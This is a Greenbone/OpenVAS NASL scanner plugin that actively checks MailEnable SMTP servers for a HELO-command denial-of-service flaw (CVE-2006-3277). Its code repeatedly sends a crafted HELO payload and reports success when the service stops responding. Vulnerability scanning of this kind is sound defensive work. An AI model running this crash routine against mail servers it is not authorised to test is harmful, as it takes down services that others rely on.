# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:mailenable:mailenable";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802914");
  script_version("2025-01-21T05:37:33+0000");
  script_tag(name:"last_modification", value:"2025-01-21 05:37:33 +0000 (Tue, 21 Jan 2025)");
  script_tag(name:"creation_date", value:"2012-07-12 17:17:25 +0530 (Thu, 12 Jul 2012)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");

  script_cve_id("CVE-2006-3277");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("MailEnable <= 2.0 SMTP HELO DoS Vulnerability - Active Check");

  script_category(ACT_DENIAL);

  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("SMTP problems");
  script_dependencies("gb_mailenable_consolidation.nasl");
  script_mandatory_keys("mailenable/smtp/detected");
  script_require_ports("Services/smtp", 25);

  script_tag(name:"summary", value:"MailEnable is prone to a denial of service (DoS)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted SMTP HELO request and checks if the service
  is still available.");

  script_tag(name:"insight", value:"MailEnable SMTP service fails to handle the HELO command. This
  can be exploited to crash the service via a HELO command with specially crafted arguments.");

  script_tag(name:"impact", value:"Successful exploitation could allow remote attackers to crash
  the service by sending HELO command with specially crafted arguments.");

  script_tag(name:"affected", value:"- MailEnable Standard version 1.92 and prior

  - MailEnable Enterprise version 2.0 and prior

  - MailEnable Professional version 2.0 and prior");

  script_tag(name:"solution", value:"Update to version 6 or later.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/20790");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/18630");
  script_xref(name:"URL", value:"http://securitytracker.com/id?1016376");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/27387");
  script_xref(name:"URL", value:"http://www.mailenable.com/hotfix/default.asp");

  exit(0);
}

include("host_details.inc");

if (!port = get_app_port(cpe: CPE, service: "SMTP"))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

data = 'HELO \0x41\r\n';

for (i = 1; i<= 100; i++) {
  soc = open_sock_tcp(port);

  if (soc) {
    j = 0;
    send(socket: soc, data: data);
    close(soc);
  } else {
    sleep(1);
    ## if it fails to connect 3 consecutive times.
    if (++j > 2) {
      report = "The service seems to be not responding to connection requests which indicates a successful DoS attack.";
      security_message(port: port, data: report);
      exit(0);
    }
  }
}

exit(99);
